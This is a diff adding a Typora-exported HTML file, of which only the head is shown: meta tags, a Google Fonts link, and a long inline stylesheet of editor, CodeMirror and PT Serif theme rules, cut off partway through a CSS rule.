@@ -1,0 +1,907 @@
+<!doctype html>
+<html>
+<head>
+<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
+
+<link href='https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700,700italic&subset=latin,cyrillic-ext,cyrillic,latin-ext' rel='stylesheet' type='text/css' /><style type='text/css'>html {overflow-x: initial !important;}:root { --bg-color: #ffffff; --text-color: #333333; --select-text-bg-color: #B5D6FC; --select-text-font-color: auto; --monospace: "Lucida Console",Consolas,"Courier",monospace; --title-bar-height: 20px; }
+.mac-os-11 { --title-bar-height: 28px; }
+html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
+h1, h2, h3, h4, h5 { white-space: pre-wrap; }
+body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.428571; overflow-x: hidden; background: inherit; }
+iframe { margin: auto; }
+a.url { word-break: break-all; }
+a:active, a:hover { outline: 0px; }
+.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }
+#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }
+#write.first-line-indent p { text-indent: 2em; }
+#write.first-line-indent li p, #write.first-line-indent p * { text-indent: 0px; }
+#write.first-line-indent li { margin-left: 2em; }
+.for-image #write { padding-left: 8px; padding-right: 8px; }
+body.typora-export { padding-left: 30px; padding-right: 30px; }
+.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }
+.typora-export .task-list-item input { pointer-events: none; }
+@media screen and (max-width: 500px) {
+  body.typora-export { padding-left: 0px; padding-right: 0px; }
+  #write { padding-left: 20px; padding-right: 20px; }
+}
+#write li > figure:last-child { margin-bottom: 0.5rem; }
+#write ol, #write ul { position: relative; }
+img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }
+button, input, select, textarea { color: inherit; font-style: inherit; font-variant-caps: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; font-size-adjust: inherit; font-kerning: inherit; font-variant-alternates: inherit; font-variant-ligatures: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-variant-position: inherit; font-variant-emoji: inherit; font-feature-settings: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; }
+input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }
+*, ::after, ::before { box-sizing: border-box; }
+#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; }
+#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p { position: relative; }
+p { line-height: inherit; }
+h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }
+p { orphans: 4; }
+h1 { font-size: 2rem; }
+h2 { font-size: 1.8rem; }
+h3 { font-size: 1.6rem; }
+h4 { font-size: 1.4rem; }
+h5 { font-size: 1.2rem; }
+h6 { font-size: 1rem; }
+.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }
+.hidden { display: none; }
+.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }
+a { cursor: pointer; }
+sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }
+sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }
+#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }
+figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }
+figure > table { margin: 0px; }
+thead, tr { break-inside: avoid; break-after: auto; }
+thead { display: table-header-group; }
+table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }
+table.md-table td { min-width: 32px; }
+.CodeMirror-gutters { border-right-width: 0px; border-right-style: none; border-right-color: currentcolor; background-color: inherit; }
+.CodeMirror-linenumber { -webkit-user-select: none; }
+.CodeMirror { text-align: left; }
+.CodeMirror-placeholder { opacity: 0.3; }
+.CodeMirror pre { padding: 0px 4px; }
+.CodeMirror-lines { padding: 0px; }
+div.hr:focus { cursor: none; }
+#write pre { white-space: pre-wrap; }
+#write.fences-no-line-wrapping pre { white-space: pre; }
+#write pre.ty-contain-cm { white-space: normal; }
+.CodeMirror-gutters { margin-right: 4px; }
+.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }
+.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }
+#write .md-fences.mock-cm { white-space: pre-wrap; }
+.md-fences.md-fences-with-lineno { padding-left: 0px; }
+#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }
+.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }
+.CodeMirror-line, twitterwidget { break-inside: avoid; }
+svg { break-inside: avoid; }
+.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }
+.footnotes + .footnotes { margin-top: 0px; }
+.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }
+li div { padding-top: 0px; }
+blockquote { margin: 1rem 0px; }
+li .mathjax-block, li p { margin: 0.5rem 0px; }
+li blockquote { margin: 1rem 0px; }
+li { margin: 0px; position: relative; }
+blockquote > :last-child { margin-bottom: 0px; }
+blockquote > :first-child, li > :first-child { margin-top: 0px; }
+.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }
+#write .footnote-line { white-space: pre-wrap; }
+@media print {
+  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }
+  #write { margin-top: 0px; border-color: transparent !important; padding-top: 0px !important; padding-bottom: 0px !important; }
+  .typora-export * { print-color-adjust: exact; }
+  .typora-export #write { break-after: avoid; }
+  .typora-export #write::after { height: 0px; }
+  .is-mac table { break-inside: avoid; }
+  #write > p:nth-child(1) { margin-top: 0px; }
+  .typora-export-show-outline .typora-export-sidebar { display: none; }
+  figure { overflow-x: visible; }
+}
+.footnote-line { margin-top: 0.714em; font-size: 0.7em; }
+a img, img a { cursor: pointer; }
+pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }
+p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }
+#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }
+p > .md-image:only-child { display: inline-block; width: 100%; }
+#write .MathJax_Display { margin: 0.8em 0px 0px; }
+.md-math-block { width: 100%; }
+.md-math-block:not(:empty)::after { display: none; }
+.MathJax_ref { fill: currentcolor; }
+[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }
+.md-task-list-item { position: relative; list-style-type: none; }
+.task-list-item.md-task-list-item { padding-left: 0px; }
+.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: medium; }
+.math { font-size: 1rem; }
+.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }
+.md-toc-content { position: relative; margin-left: 0px; }
+.md-toc-content::after, .md-toc::after { display: none; }
+.md-toc-item { display: block; color: rgb(65, 131, 196); }
+.md-toc-item a { text-decoration: none; }
+.md-toc-inner:hover { text-decoration: underline; }
+.md-toc-inner { display: inline-block; cursor: pointer; }
+.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }
+.md-toc-h2 .md-toc-inner { margin-left: 2em; }
+.md-toc-h3 .md-toc-inner { margin-left: 4em; }
+.md-toc-h4 .md-toc-inner { margin-left: 6em; }
+.md-toc-h5 .md-toc-inner { margin-left: 8em; }
+.md-toc-h6 .md-toc-inner { margin-left: 10em; }
+@media screen and (max-width: 48em) {
+  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }
+  .md-toc-h4 .md-toc-inner { margin-left: 5em; }
+  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }
+  .md-toc-h6 .md-toc-inner { margin-left: 8em; }
+}
+a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }
+.footnote-line a:not(.reversefootnote) { color: inherit; }
+.reversefootnote { font-family: ui-monospace, sans-serif; }
+.md-attr { display: none; }
+.md-fn-count::after { content: "."; }
+code, pre, samp, tt { font-family: var(--monospace); }
+kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }
+.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }
+code { text-align: left; vertical-align: initial; }
+a.md-print-anchor { white-space: pre !important; border-width: medium !important; border-style: none !important; border-color: currentcolor !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }
+.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }
+.md-diagram-panel > svg { max-width: 100%; }
+[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }
+[lang="mermaid"] .node text { font-size: 1rem; }
+table tr th { border-bottom-width: 0px; border-bottom-style: none; border-bottom-color: currentcolor; }
+video { max-width: 100%; display: block; margin: 0px auto; }
+iframe { max-width: 100%; width: 100%; border: medium; }
+.highlight td, .highlight tr { border: 0px; }
+mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }
+.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }
+.md-expand mark .md-meta { opacity: 0.3 !important; }
+mark .md-meta { color: rgb(0, 0, 0); }
+@media print {
+  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }
+}
+.md-diagram-panel .messageText { stroke: none !important; }
+.md-diagram-panel .start-state { fill: var(--node-fill); }
+.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }
+.md-fences.md-fences-math { font-size: 1em; }
+.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }
+.md-fences-advanced:not(.md-focus) { background: inherit; }
+.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }
+.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }
+.typora-export-show-outline #write { --webkit-flex: 2; flex: 2 1 0%; }
+.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }
+@media screen and (max-width: 1024px) {
+  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }
+}
+@media screen and (max-width: 800px) {
+  .typora-export-sidebar { display: none; }
+}
+.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; overflow-wrap: anywhere; }
+.outline-content ul { margin-top: 0px; margin-bottom: 0px; }
+.outline-content strong { font-weight: 400; }
+.outline-expander { width: 1rem; height: 1.428571rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }
+.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }
+.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }
+.outline-expander:hover::before { content: ""; }
+.outline-h1 > .outline-item { padding-left: 0px; }
+.outline-h2 > .outline-item { padding-left: 1em; }
+.outline-h3 > .outline-item { padding-left: 2em; }
+.outline-h4 > .outline-item { padding-left: 3em; }
+.outline-h5 > .outline-item { padding-left: 4em; }
+.outline-h6 > .outline-item { padding-left: 5em; }
+.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }
+.outline-label:hover { text-decoration: underline; }
+.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }
+.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left-width: 28px; border-left-style: solid; border-left-color: transparent; border-right-width: 28px; border-right-style: solid; border-right-color: transparent; }
+.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }
+.outline-item-open > .outline-item > .outline-expander::before { content: ""; }
+.outline-children { display: none; }
+.info-panel-tab-wrapper { display: none; }
+.outline-item-open > .outline-children { display: block; }
+.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }
+.typora-export .outline-item:hover { margin-right: -8px; border-right-width: 8px; border-right-style: solid; border-right-color: transparent; }
+.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }
+.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }
+.typora-export-collapse-outline .outline-children { display: none; }
+.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }
+.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }
+.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }
+.md-inline-math-container mjx-container { zoom: 0.95; }
+mjx-container { break-inside: avoid; }
+.md-alert.md-alert-note { border-left-color: rgb(9, 105, 218); }
+.md-alert.md-alert-important { border-left-color: rgb(130, 80, 223); }
+.md-alert.md-alert-warning { border-left-color: rgb(154, 103, 0); }
+.md-alert.md-alert-tip { border-left-color: rgb(31, 136, 61); }
+.md-alert.md-alert-caution { border-left-color: rgb(207, 34, 46); }
+.md-alert { padding: 0px 1em; margin-bottom: 16px; color: inherit; border-left-width: 0.25em; border-left-style: solid; border-left-color: rgb(0, 0, 0); }
+.md-alert-text-note { color: rgb(9, 105, 218); }
+.md-alert-text-important { color: rgb(130, 80, 223); }
+.md-alert-text-warning { color: rgb(154, 103, 0); }
+.md-alert-text-tip { color: rgb(31, 136, 61); }
+.md-alert-text-caution { color: rgb(207, 34, 46); }
+.md-alert-text { font-size: 0.9rem; font-weight: 700; }
+.md-alert-text svg { fill: currentcolor; position: relative; top: 0.125em; margin-right: 1ch; overflow: visible; }
+.md-alert-text-container::after { content: attr(data-text); text-transform: capitalize; pointer-events: none; margin-right: 1ch; }
+
+
+.CodeMirror { height: auto; }
+.CodeMirror.cm-s-inner { background: inherit; }
+.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }
+.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }
+.CodeMirror-gutters { border-right-width: 1px; border-right-style: solid; border-right-color: rgb(221, 221, 221); background: inherit; white-space: nowrap; }
+.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }
+.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }
+.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }
+.cm-s-inner .cm-number { color: rgb(17, 102, 68); }
+.cm-s-inner .cm-def { color: rgb(0, 0, 255); }
+.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }
+.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }
+.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }
+.cm-s-inner .cm-string { color: rgb(170, 17, 17); }
+.cm-s-inner .cm-property { color: rgb(0, 0, 0); }
+.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }
+.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }
+.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }
+.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }
+.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }
+.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }
+.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }
+.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }
+.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }
+.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }
+.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }
+.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }
+.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }
+.cm-negative { color: rgb(221, 68, 68); }
+.cm-positive { color: rgb(34, 153, 34); }
+.cm-header, .cm-strong { font-weight: 700; }
+.cm-del { text-decoration: line-through; }
+.cm-em { font-style: italic; }
+.cm-link { text-decoration: underline; }
+.cm-error { color: red; }
+.cm-invalidchar { color: red; }
+.cm-constant { color: rgb(38, 139, 210); }
+.cm-defined { color: rgb(181, 137, 0); }
+div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }
+div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }
+.cm-s-inner .CodeMirror-activeline-background { background: inherit; }
+.CodeMirror { position: relative; overflow: hidden; }
+.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }
+.CodeMirror-sizer { position: relative; }
+.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; outline: 0px; }
+.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }
+.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: auto hidden; }
+.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }
+.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }
+.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 10px; z-index: 3; overflow-y: hidden; }
+.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }
+.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: medium !important; }
+.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }
+.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }
+.CodeMirror-lines { cursor: text; }
+.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }
+.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }
+.CodeMirror-code pre { border-right-width: 30px; border-right-style: solid; border-right-color: transparent; width: fit-content; }
+.CodeMirror-wrap .CodeMirror-code pre { border-right-width: medium; border-right-style: none; border-right-color: currentcolor; width: auto; }
+.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }
+.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }
+.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }
+.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }
+.CodeMirror-measure pre { position: static; }
+.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right-width: medium; border-right-style: none; border-right-color: currentcolor; width: 0px; }
+.CodeMirror div.CodeMirror-cursor { visibility: hidden; }
+.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }
+.cm-searching { background: rgba(255, 255, 0, 0.4); }
+span.cm-underlined { text-decoration: underline; }
+span.cm-strikethrough { text-decoration: line-through; }
+.cm-tw-syntaxerror { color: rgb(255, 255, 255); background-color: rgb(153, 0, 0); }
+.cm-tw-deleted { text-decoration: line-through; }
+.cm-tw-header5 { font-weight: 700; }
+.cm-tw-listitem:first-child { padding-left: 10px; }
+.cm-tw-box { border-style: solid; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-color: inherit; border-top-width: 0px !important; }
+.cm-tw-underline { text-decoration: underline; }
+@media print {
+  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }
+}
+
+
+/* meyer reset -- http://meyerweb.com/eric/tools/css/reset/ , v2.0 | 20110126 | License: none (public domain) */
+
+@include-when-export url(https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700,700italic&subset=latin,cyrillic-ext,cyrillic,latin-ext);
+
+/* =========== */
+
+/* pt-serif-regular - latin */
+/* pt-serif-italic - latin */
+/* pt-serif-700 - latin */
+/* pt-serif-700italic - latin */
+:root {
+	--active-file-bg-color: #dadada;
+	--active-file-bg-color: rgba(32, 43, 51, 0.63);
+	--active-file-text-color: white;
+	--bg-color: #f3f2ee;
+	--text-color: #1f0909;
+	--control-text-color: #444;
+	--rawblock-edit-panel-bd: #e5e5e5;
+
+	--select-text-bg-color: rgba(32, 43, 51, 0.63);
+  --select-text-font-color: white;
+}
+
+pre {
+	--select-text-bg-color: #36284e;
+	--select-text-font-color: #fff;
+}
+
+html {
+	font-size: 16px;
+	-webkit-font-smoothing: antialiased;
+}
+
+html, body {
+	background-color: #f3f2ee;
+	font-family: "PT Serif", 'Times New Roman', Times, serif;
+	color: #1f0909;
+	line-height: 1.5em;
+}
+
+/*#write {
+	overflow-x: auto;
+    max-width: initial;
+	padding-left: calc(50% - 17em);
+    padding-right: calc(50% - 17em);
+}
+
+@media (max-width: 36em) {
+ 	#write {
+ 		padding-left: 1em;
+    	padding-right: 1em;
+ 	}
+}*/
+
+#write {
+	max-width: 40em;
+}
+
+@media only screen and (min-width: 1400px) {
+	#write {
+			max-width: 914px;
+	}
+}
+
+ol li {
+	list-style-type: decimal;
+	list-style-position: outside;
+}
+ul li {
+	list-style-type: disc;
+	list-style-position: outside;
+}
+
+ol,
+ul {
+	list-style: none;
+}
+
+blockquote,
+q {
+	quotes: none;
+}
+blockquote:before,
+blockquote:after,
+q:before,
+q:after {
+	content: '';
+	content: none;
+}
+table {
+	border-collapse: collapse;
+	border-spacing: 0;
+}
+/* styles */
+
+/* ====== */
+
+/* headings */
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+	font-weight: bold;
+}
+h1 {
+	font-size: 1.875em;
+	/*30 / 16*/
+	line-height: 1.6em;
+	/* 48 / 30*/
+	margin-top: 2em;
+}
+h2,
+h3 {
+	font-size: 1.3125em;
+	/*21 / 16*/
+	line-height: 1.15;
+	/*24 / 21*/
+	margin-top: 2.285714em;
+	/*48 / 21*/
+	margin-bottom: 1.15em;
+	/*24 / 21*/
+}
+h3 {
+	font-weight: normal;
+}
+h4 {
+	font-size: 1.125em;
+	/*18 / 16*/
+	margin-top: 2.67em;
+	/*48 / 18*/
+}
+h5,
+h6 {
+	font-size: 1em;
+	/*16*/
+}
+h1 {
+	border-bottom: 1px solid;
+	margin-bottom: 1.875em;
+	padding-bottom: 0.8125em;
+}
+/* links */
+
+a {
+	text-decoration: none;
+	color: #065588;
+}
+a:hover,
+a:active {
+	text-decoration: underline;
+}
+/* block spacing */
+
+p,
+blockquote,
+.md-fences {
+	margin-bottom: 1.5em;
+}
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+	margin-bottom: 1.5em;
+}
+/* blockquote */
+
+blockquote {
+	font-style: italic;
+	border-left: 5px solid;
+	margin-left: 2em;
+	padding-left: 1em;
+}
+/* lists */
+
+ul,
+ol {
+	margin: 0 0 1.5em 1.5em;
+}
+/* tables */
+.md-meta,.md-before, .md-after {
+	color:#999;
+}
+
+table {
+	margin-bottom: 1.5em;
+	/*24 / 16*/
+	font-size: 1em;
+	/* width: 100%; */
+}
+thead th,
+tfoot th {
+	padding: .25em .25em .25em .4em;
+	text-transform: uppercase;
+}
+th {
+	text-align: left;
+}
+td {
+	vertical-align: top;
+	padding: .25em .25em .25em .4em;
+}
+
+code,
+.md-fences {
+	background-color: #dadada;
+}
+
+code {
+	padding-left: 2px;
+	padding-right: 2px;
+}
+
+.md-fences {
+	margin-left: 2em;
+	margin-bottom: 3em;
+	padding-left: 1ch;
+	padding-right: 1ch;
+}
+
+pre,
+code,
+tt {
+	font-size: .875em;
+	line-height: 1.714285em;
+}
+/* some fixes */
+
+h1 {
+	line-height: 1.3em;
+	font-weight: normal;
+	margin-bottom: 0.5em;
+}
+
+p + ul,
+p + ol{
+	margin-top: .5em;
+}
+
+h3 + ul,
+h4 + ul,
+h5 + ul,
+h6 + ul,
+h3 + ol,
+h4 + ol,
+h5 + ol,
+h6 + ol {
+	margin-top: .5em;
+}
+
+li > ul,
+li > ol {
+	margin-top: inherit;
+	margin-bottom: 0;
+}
+
+li ol>li {
+	list-style-type: lower-alpha;
+}
+
+li li ol>li{
+	list-style-type: lower-roman;
+}
+
+h2,
+h3 {
+	margin-bottom: .75em;
+}
+hr {
+	border-top: none;
+	border-right: none;
+	border-bottom: 1px solid;
+	border-left: none;
+}
+h1 {
+	border-color: #c5c5c5;
+}
+blockquote {
+	border-color: #bababa;
+	color: #656565;
+}
+
+blockquote ul,
+blockquote ol {
+	margin-left:0;
+}
+
+.ty-table-edit {
+	background-color: transparent;
+}
+thead {
+	background-color: #dadada;
+}
+tr:nth-child(even) {
+	background: #e8e7e7;
+}
+hr {
+	border-color: #c5c5c5;
+}
+.task-list{
+	padding-left: 1rem;
+}
+
+.md-task-list-item {
+	padding-left: 1.5rem;
+	list-style-type: none;
+}
+
+.md-task-list-item > input:before {
+	content: '\221A';
+	display: inline-block;
+	width: 1.25rem;
+  	height: 1.6rem;
+	vertical-align: middle;
+	text-align: center;
+	color: #ddd;
+	background-color: #F3F2EE;
+}
+
+.md-task-list-item > input:checked:before,
+.md-task-list-item > input[checked]:before{
+	color: inherit;
+}
+
+#write pre.md-meta-block {
+	min-height: 1.875rem;
+	color: #555;
+	border: 0px;
+	background: transparent;
+	margin-top: -4px;
+	margin-left: 1em;
+	margin-top: 1em;
+}
+
+.md-image>.md-meta {
+	color: #9B5146;
+}
+
+.md-image>.md-meta{
+	font-family: Menlo, 'Ubuntu Mono', Consolas, 'Courier New', 'Microsoft Yahei', 'Hiragino Sans GB', 'WenQuanYi Micro Hei', serif;
+}
+
+
+#write>h3.md-focus:before{
+	left: -1.5rem;
+	color:#999;
+	border-color:#999;
+}
+#write>h4.md-focus:before{
+	left: -1.5rem;
+	top: .25rem;
+	color:#999;
+	border-color:#999;
+}
+#write>h5.md-focus:before{
+	left: -1.5rem;
+	top: .0.3125rem;
+	color:#999;
+	border-color:#999;
+}
+#write>h6.md-focus:before{
+	left: -1.5rem;
+	top: 0.3125rem;
+	color:#999;
+	border-color:#999;
+}
+
+.md-toc:focus .md-toc-content{
+	margin-top: 19px;
+}
+
+.md-toc-content:empty:before{
+	color: #065588;
+}
+.md-toc-item {
+	color: #065588;
+}
+#write div.md-toc-tooltip {
+	background-color: #f3f2ee;
+}
+
+#typora-sidebar {
+	background-color: #f3f2ee;
+	-webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
+  	box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
+}
+
+.pin-outline #typora-sidebar {
+	background: inherit;
+	box-shadow: none;
+	border-right: 1px dashed;
+}
+
+.pin-outline #typora-sidebar:hover .outline-title-wrapper {
+	border-left:1px dashed;
+}
+
+.outline-item:hover {
+  background-color: #dadada;
+  border-left: 28px solid #dadada;
+  border-right: 18px solid #dadada;
+}
+
+.typora-node .outline-item:hover {
+  	border-right: 28px solid #dadada;
+}
+
+.outline-expander:before {
+  content: "\f0da";
+  font-family: FontAwesome;
+  font-size:14px;
+  top: 1px;
+}
+
+.outline-expander:hover:before,
+.outline-item-open>.outline-item>.outline-expander:before {
+  content: "\f0d7";
+}
+
+.modal-content {
+	background-color: #f3f2ee;
+}
+
+.auto-suggest-container ul li {
+	list-style-type: none;
+}
+
+/** UI for electron */
+
+.megamenu-menu,
+#top-titlebar, #top-titlebar *,
+.megamenu-content {
+	background: #f3f2ee;
+	color: #1f0909;
+}
+
+.megamenu-menu-header {
+	border-bottom: 1px dashed #202B33;
+}
+
+.megamenu-menu {
+	box-shadow: none;
+	border-right: 1px dashed;
+}
+
+header, .context-menu, .megamenu-content, footer {
+	font-family: "PT Serif", 'Times New Roman', Times, serif;
+    color: #1f0909;
+}
+
+#megamenu-back-btn {
+	color: #1f0909;
+	border-color: #1f0909;
+}
+
+.megamenu-menu-header #megamenu-menu-header-title:before {
+	color: #1f0909;
+}
+
+.megamenu-menu-list li a:hover, .megamenu-menu-list li a.active {
+	color: inherit;
+	background-color: #e8e7df;
+}
+
+.long-btn:hover {
+	background-color: #e8e7df;
+}
+
+#recent-file-panel tbody tr:nth-child(2n-1) {
+    background-color: transparent !important;
+}
+
+.megamenu-menu-panel tbody tr:hover td:nth-child(2) {
+    color: inherit;
+}
+
+.megamenu-menu-panel .btn {
+	background-color: #D2D1D1;
+}
+
+.btn-default {
+	background-color: transparent;
+}
+
+.typora-sourceview-on #toggle-sourceview-btn,
+.ty-show-word-count #footer-word-count {
+	background: #c7c5c5;
+}
+
+#typora-quick-open {
+    background-color: inherit;
+}
+
+.md-diagram-panel {
+	margin-top: 8px;
+}
+
+.file-list-item-file-name {
+	font-weight: initial;
+}
+
+.file-list-item-summary {
+	opacity: 1;
